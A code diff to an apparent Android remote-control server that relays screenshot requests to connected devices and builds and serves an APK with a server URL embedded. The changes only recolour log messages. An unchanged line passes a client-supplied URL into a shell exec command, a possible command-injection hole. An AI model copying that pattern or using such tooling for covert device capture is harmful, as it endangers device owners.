@@ -114,7 +114,7 @@ async function saveScreenshot(imageBuffer, deviceUuid) {
         await fs.mkdir('screenshots', { recursive: true });
         await fs.writeFile(filepath, imageBuffer);
 
-        console.log(`Screenshot saved: screenshots/${filename}`);
+        console.log(chalk.green(`[✓] Screenshot saved: screenshots/${filename}`));
         return filename;
     } catch (error) {
         console.error('Error saving screenshot:', error);
@@ -382,7 +382,7 @@ androidIo.on("connection", async (socket) => {
                     timestamp: Date.now()
                 });
 
-                console.log(`Screenshot saved: screenshots/${filename}`);
+                console.log(chalk.green(`[✓] Screenshot saved: screenshots/${filename}`));
             } catch (err) {
                 console.error('Screenshot response error:', err);
                 frontendIo.emit("screenshot_error", { device_uuid: deviceUuid, error: err.message });
@@ -416,7 +416,7 @@ frontendIo.on("connection", async (socket) => {
             return;
         }
 
-        console.log(`Relaying screenshot request to device: ${deviceId} from frontend: ${socket.id}`);
+        console.log(chalk.cyan(`[i] Relaying screenshot request to device: ${deviceId} from frontend: ${socket.id}`));
 
         try {
             let device = devices.get(deviceId);
@@ -558,7 +558,7 @@ frontendIo.on("connection", async (socket) => {
         try {
             const filepath = `screenshots/${filename}`;
             await fs.unlink(filepath);
-            console.log(`Screenshot deleted: ${filepath}`);
+            console.log(chalk.red(`[x] Screenshot deleted: ${filepath}`));
             socket.emit("delete_screenshot_success", { filename });
         } catch (error) {
             console.error('Error deleting screenshot:', error);
@@ -568,12 +568,11 @@ frontendIo.on("connection", async (socket) => {
 
     socket.on("build_request", async (data) => {
         const { serverUrl } = data;
-        console.log(`Build request for URL: ${serverUrl}`);
-        const androidUrl = normalizeUrl(serverUrl);
-        console.log(`Using Android URL: ${androidUrl}`);
-        frontendIo.emit("build_started", { androidUrl });
+        const normalizedUrl = normalizeUrl(serverUrl);
+        console.log(chalk.cyan(`[i] Build request with server: ${serverUrl}`));
+        frontendIo.emit("build_started", { normalizedUrl });
 
-        const command = `cd /android-project && ./gradlew assembleRelease -PserverUrl='${androidUrl}' --no-daemon --stacktrace`;
+        const command = `cd /android-project && ./gradlew assembleRelease -PserverUrl='${normalizedUrl}' --no-daemon --stacktrace`;
 
         exec(command, { cwd: '/android-project' }, (error, stdout, stderr) => {
             if (error) {
@@ -582,7 +581,7 @@ frontendIo.on("connection", async (socket) => {
                 socket.emit("build_error", { success: false, error: error.message, stderr });
                 return;
             }
-            console.log(`Build successful: ${stdout}`);
+            console.log(chalk.green(`[+] Build successful: ${stdout}`));
             socket.emit("build_success", { success: true });
         });
     });
@@ -593,7 +592,7 @@ frontendIo.on("connection", async (socket) => {
         try {
             const buffer = await fs.readFile(apkPath);
             socket.emit("apk_data", buffer);
-            console.log(`APK sent to frontend ${socket.id}`);
+            console.log(chalk.green(`[+] APK sent to frontend ${socket.id}`));
         } catch (error) {
             console.error(`Error reading APK: ${error.message}`);
             socket.emit("apk_error", { error: "APK not found or build not completed" });
